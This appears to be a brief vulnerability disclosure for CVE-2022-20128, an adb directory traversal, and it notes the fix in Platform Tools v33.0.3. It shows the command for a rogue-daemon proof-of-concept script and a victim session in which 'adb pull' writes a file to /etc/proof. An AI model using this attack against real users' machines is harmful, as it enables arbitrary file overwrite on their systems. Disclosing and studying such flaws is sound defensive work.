# CVE-2022-20128
Android Debug Bridge (adb) was vulnerable to directory traversal attacks that could have been mounted by rogue/compromised adb daemons during an adb pull operation.

The rogue device:

```
./adbdirtrav.py -lp 5111 --content "hello world" --destination-path /etc/proof
```

The victim:

```
root@eedd4cb8b202:/tmp/platform-tools# cat /etc/proof
cat: /etc/proof: No such file or directory

root@eedd4cb8b202:/tmp/platform-tools# ./adb connect 10.6.8.145:5111
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to 10.6.8.145:5111

root@eedd4cb8b202:/tmp/platform-tools# ./adb devices
List of devices attached
10.6.8.145:5111  device

root@eedd4cb8b202:/tmp/platform-tools# ./adb pull /data/local/tmp/1 /tmp/sdfsdf
/data/local/tmp/1/: 1 file pulled, 0 skipped. 0.0 MB/s (11 bytes in 0.150s)

root@eedd4cb8b202:/tmp/platform-tools# cat /etc/proof
hello world
```

This was fixed in Platform Tools v33.0.3.
